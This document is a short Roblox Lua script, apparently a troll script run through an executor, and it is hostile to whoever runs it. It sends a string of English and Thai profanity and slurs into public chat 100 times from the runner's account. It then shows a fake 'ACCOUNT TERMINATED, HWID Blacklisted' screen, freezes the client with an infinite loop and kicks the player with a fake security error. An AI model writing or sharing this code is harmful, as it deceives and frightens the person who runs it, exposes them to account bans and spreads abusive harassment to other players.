local p = game:GetService("Players").LocalPlayer
local r = game:GetService("ReplicatedStorage")
local s = r:FindFirstChild("DefaultChatSystemChatEvents") and r.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")

spawn(function()
    if s then
        for i = 1, 100 do
            task.wait(0.1)
            s:FireServer("Fuck dick ควย สัส พ่อมึงตาย เหี้ย ปัญญาอ่อน กาก โง่ ควาย ezzzzzzzzzzz nooooob kid เสียว เงี่ยน Garbage Kiddocope เย็ด กระจอก ลูกกระหรี่ ", "All")
        end
    end
end)

local g = Instance.new("ScreenGui", p.PlayerGui)
local t = Instance.new("TextLabel", g)
t.Size = UDim2.new(1, 0, 1, 0)
t.BackgroundColor3 = Color3.new(0, 0, 0)
t.TextColor3 = Color3.new(1, 0, 0)
t.TextScaled = true
t.Text = "ACCOUNT TERMINATED\nReason: HWID Blacklisted\n(Please restart your PC)"

spawn(function()
    while true do
        local x = math.random(1, 100) * math.sin(100)
    end
end)

task.wait(3)
p:Kick("Critical Error: Unauthorized Executor Detected.")
